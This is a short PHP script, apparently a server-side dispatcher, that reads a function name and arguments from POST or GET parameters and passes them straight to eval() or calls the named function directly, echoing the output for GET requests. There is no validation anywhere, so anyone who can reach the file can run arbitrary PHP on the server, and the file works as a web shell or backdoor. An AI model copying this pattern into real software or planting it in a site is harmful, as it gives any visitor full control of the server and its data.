<?php
require_once('includes/php_session/init.php');

if (isset($_POST['funct']) and isset($_POST['args']))
{
    $f = $_POST['funct'];
    $a = $_POST['args'];
    eval("$f($a);");
    // $f($a);
}
elseif (isset($_POST['funct']))
{
    $f = $_POST['funct'];
    $f();
}
elseif (isset($_GET['f']) and isset($_GET['a']))
{
    $f = $_GET['f'];
    $a = $_GET['a'];
    print "<pre>";
    eval("$f($a);");
    print "</pre>";
}
